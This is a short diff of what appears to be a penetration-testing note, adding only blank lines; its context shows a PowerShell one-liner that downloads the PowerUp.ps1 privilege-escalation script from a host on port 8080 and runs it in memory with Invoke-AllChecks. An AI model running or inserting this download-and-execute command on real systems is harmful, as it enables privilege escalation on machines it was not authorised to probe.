@@ -17,3 +17,5 @@ updated_at: '2023-05-29T16:48:52.884824+00:00'
 IEX(New-Object Net.Webclient).DownloadString('http://192.168.1.10:8080/tools/ps/PowerUp.ps1');Invoke-AllChecks
 
 ```
+
+
